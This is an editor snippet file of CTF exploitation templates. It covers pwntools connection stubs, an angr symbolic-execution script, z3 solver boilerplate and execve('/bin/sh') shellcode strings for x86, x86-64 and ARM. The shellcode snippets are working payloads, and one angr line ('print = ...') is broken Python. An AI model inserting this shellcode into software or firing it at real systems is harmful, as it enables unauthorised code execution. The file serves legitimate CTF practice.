snippet pwn
	#!/usr/bin/env python
	# -*- coding: utf-8 -*-
	from pwn import *   # pip install pwntools
	
	r = remote("localhost", 4000)
	
	r.interactive()
snippet angr
	#!/usr/bin/env python
	# -*- coding: utf-8 -*-
	import angr
	import claripy
	
	angr.l.setLevel("DEBUG")
	p = angr.Project("./vul", load_options={"auto_load_libs": False})
	
	add_options = {"BYPASS_UNSUPPORTED_SYSCALL"}
	argv1 = claripy.BVS("argv1", 8 * 100)
	s = p.factory.entry_state(args=[p.filename, argv1], add_options=add_options)
	# s = p.factory.blank_state(addr=main, add_options=add_options)
	
	for c in argv1.chop(8):
	    s.add_constraints(c >= ' ')
	    s.add_constraints(c <= '~')

	# state.add_constraints(argv1.get_byte(0) >= argv[1].get_byte(1))
	
	pg = p.factory.path_group(s, immutable=False, threads=4)
	
	find_addrs = (0x400546, )
	avoid_addrs = ()
	pg.explore(find=find_addrs, avoid=avoid_addrs)
	print pg

	if pg.found:
	    fs = pg.found[0].state
	    # print fs.se.any_str(argv1)    # argv1
	    # print fs.se.posix.dumps(0)    # stdin
	    # print fs.se.any_str(fs.memory.load(0x601050, 29)) # mem
	    print = pg.found[0].state.se._solver.result.model
snippet pdb
	import ipdb; ipdb.set_trace()
snippet sc32
	"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
snippet sc64
	"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
snippet scarm
	"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
snippet r
	r.recvuntil("${1}")
snippet s
	r.sendline(${1})
snippet inter
	r.interactive()
snippet z3
	#!/usr/bin/env python
	# -*- coding: utf-8 -*-
	from z3 import *
	
	x = [BitVec("x%d" % i, 8) for i in range(32)]
	
	s = Solver()
	s.add()
	
	if s.check() != sat:
	    print "Unsat"
	else:
	    m = s.model()
	    print "".join([chr(m[x[i]].as_long()) for i in range(32)])
snippet bv
	[BitVec("x_%d" % i, 32) for i in range(32)]
snippet ans
	print "".join([chr(m[x[i]].as_long()) for i in range(32)])
